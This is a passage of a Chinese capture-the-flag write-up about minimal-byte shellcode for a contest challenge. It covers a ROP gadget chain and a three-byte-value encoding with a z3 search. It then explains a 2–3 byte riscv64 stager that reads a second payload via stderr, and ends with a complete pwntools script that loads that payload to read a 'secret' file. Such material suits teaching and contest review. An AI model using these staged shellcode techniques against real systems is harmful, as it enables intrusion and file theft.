    0x40171F; pop rdx; ret
    0x436613; mov [rdi], rdx; ret
    0x4c280a
    0x415f56; pop edi; ret
    0x7465  ; et\x00
    0x40171F; pop rdx; ret
    ret
`ret`指令必须要有一个字符`c20000`，因为shellcode的内存区域默认值就是`00`，所以可以省略`00`字符，`adc
eax`占一个字符`15`，`push eax`占一个字符`50`，所以这是这种套路必须要用的三种字符。这三种字符可以组成81种数字：
    val = ["15", "50", "c2"]
    oi = itertools.product(val, repeat=4)
然后根据ROP的值，使用这81个数字匹配出某种组合，该shellcode的难点就在这了，如何计算这种组合。我目前的思路就是随机出几种组合，使用z3进行计算，如果在一定时间内没计算出，则终止，换一套组合进行计算。
三种字符的shellcode当然不止这一种，如果只有这一种，那么当下回合这三种字符随意一种字符被加入黑名单时，该shellcode讲无用武之地。我们应该理解其原理，活学活用。
比如`ret`原本是`c3`，所以可以把`c2`替换成`c3`，还有`cb(retf)`，`ca0000(retf 0x0)`等等。
`adc`可以换成`add`或者其他，`eax`可以换成`ebx`或者其他，比如：
### 长度为3字节的shellcode
从上面图中可以发现TD战队和Katzebin战队就已经在比拼算法的优化能力了，除此之外，前三名的shellcode，不说其字符种类，其长度就只有3字节。3字节的shellcode就能读文件？比赛的时候第一次看到这三字节的shellcode时，我整个人都惊呆了?，甚至怀疑这些队伍是不是使用了什么0day修改了history文件，把自己的shellcode随意改了几个字节。
赛后复盘的时候才得知，这是`riscv64`的shellcode，作用是执行`read(2, buf, length)`系统调用，从标准错误中读取数据。
为什么能从错误输出中读取数据呢？首先来看看执行该代码的指令：
    p = subprocess.Popen([
                    os.path.join(
                        tmpdir, os.path.basename(SHUFFL_PATH)), "5",
                    f"./qemu-{arch}-static", f"./runner-{arch}"
                ], cwd=tmpdir, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=1)
标准错误(2)被重定向到标准输出(1)，而该python文件的标准输入和输出都是socket文件描述符，所以在shellcode中从标准错误读数据也就是从socket文件描述符。
反汇编一下这三个字节的shellcode：
    print(disasm(unhex("69897300000000"), arch="riscv", bits=64))
       0:   8969                    andi    a0, a0, 26
       2:   00000073                ecall
通过调试可知在`runner-riscv64`中：
          0x105ce        jal    ra, 0x10cac 
          0x105d2        lui    a2, 0x1
          0x105d4        ld     a1, -1056(s0)
     →    0x105da        jal    ra, 0x2094e 
          0x105de        ld     a5, -1056(s0)
          0x105e2        jalr   a5
          0x105e4        li     a5, 0
          0x105e6        mv     a3, a5
          0x105e8        auipc  a5, 0x60
执行完read标准输入后，就跳转到shellcode地址，在执行`jalr a5`指令时，寄存器上下文：
    $zero: 0x0000000000000000  →  0x0000000000000000
    $ra  : 0x00000000000105de  →  0x47819782be043783  →  0x47819782be043783
    $sp  : 0x00000040007ffbb0  →  0x0000000000000000  →  0x0000000000000000
    $gp  : 0x0000000000071030  →  0x0000000000000000  →  0x0000000000000000
    $tp  : 0x0000000000072710  →  0x0000000000070678  →  0x0000000000051a68  →  0x00000000000709b0  →  0x0000000000000043  →  0x0000000000000043
    $t0  : 0x0000000000072000  →  0x0000000000000000  →  0x0000000000000000
    $t1  : 0x2f2f2f2f2f2f2f2f  →  0x2f2f2f2f2f2f2f2f
    $t2  : 0x0000000000072000  →  0x0000000000000000  →  0x0000000000000000
    $fp  : 0x00000040007ffff0  →  0x0000000000000000  →  0x0000000000000000
    $s1  : 0x0000000000010b6a  →  0x0006f7b7e8221101  →  0x0006f7b7e8221101
    $a0  : 0x0000000000000004  →  0x0000000000000004
    $a1  : 0x0000004000801000  →  0x000000000a333231  →  0x000000000a333231
    $a2  : 0x0000000000001000  →  0x0000000000001000
    $a3  : 0x0000000000000022  →  0x0000000000000022
    $a4  : 0x0000004000801000  →  0x000000000a333231  →  0x000000000a333231
    $a5  : 0x0000004000801000  →  0x000000000a333231  →  0x000000000a333231
    $a6  : 0x0000000000000000  →  0x0000000000000000
    $a7  : 0x000000000000003f  →  0x000000000000003f
    $s2  : 0x0000000000000000  →  0x0000000000000000
    $s3  : 0x0000000000000000  →  0x0000000000000000
    $s4  : 0x0000000000000000  →  0x0000000000000000
    $s5  : 0x0000000000000000  →  0x0000000000000000
    $s6  : 0x0000000000000000  →  0x0000000000000000
    $s7  : 0x0000000000000000  →  0x0000000000000000
    $s8  : 0x0000000000000000  →  0x0000000000000000
    $s9  : 0x0000000000000000  →  0x0000000000000000
    $s10 : 0x0000000000000000  →  0x0000000000000000
    $s11 : 0x0000000000000000  →  0x0000000000000000
    $t3  : 0xffffffffffffffff
    $t4  : 0x000000000006ead0  →  0x0000000000070678  →  0x0000000000051a68  →  0x00000000000709b0  →  0x0000000000000043  →  0x0000000000000043
    $t5  : 0x0000000000000000  →  0x0000000000000000
    $t6  : 0x0000000000072000  →  0x0000000000000000  →  0x0000000000000000
其中，`$a0 = 4`，为`read`函数的返回值，表示标准输入的长度，`$a0`的值等于`$a5`，指向了存放shellcode的内存，`$a2 =
0x1000`，表示读取的长度，`$a7`等于0x37，对于`riscv64`价格，`$a7 =
0x37`，然后调用`ecall`指令，表示执行`read`系统调用。
所以上面那3字节的shellcode做的事就是，`$a & 0x1a`，因为输入的长度为3，所以是`3 & 0x1a =
2`，然后调用`ecall`，执行的就是`read(2, 0x0000004000801000,
0x1000)`。实际的shellcode就能通过第二次输入到内存中。
3字节的shellcode还不是最短的，还能继续优化，只需要修改`$a0=2`，那么只需要输入2字节的shellcode就能让`$a0`的值等于2，所以最短的shellcode为`7300`
下面放一个使用2字节的shellcode脚本：
    #!/usr/bin/env python3
    # -*- coding=utf-8 -*-    
    from pwn import *
    import time
    context.log_level = "debug"
    p = remote("10.11.34.96", 9090)
    # p = remote("192.168.11.4", 9090)
    shellcode1 = b"7300"
    # shellcode1 = b"000000ca00080091210000d4"  # aarch64
    shellcode2 = """
    li     s1, 0x746572636573
    sd     s1, 0(sp)
    mv     a1, sp     
    li     a7, 56
    li     a0, -100
    ecall
    li     a7, 71
    mv     a1, a0
    li     a0, 1
    li     a2, 0
    li     a3, 100
    ecall
    """
    shellcode2 = asm(shellcode2, arch="riscv", bits=64)
    shellcode2 = b"s\x00\x00\x00" + shellcode2
    p.readuntil(b"shellcode:")
    p.sendline(shellcode1)
    pause()
    p.send(shellcode2)
    p.interactive()
结果如图所示：
最后放一个我设想中，两个队伍合作统治比赛的情况：
## 参考
  1. 
* * *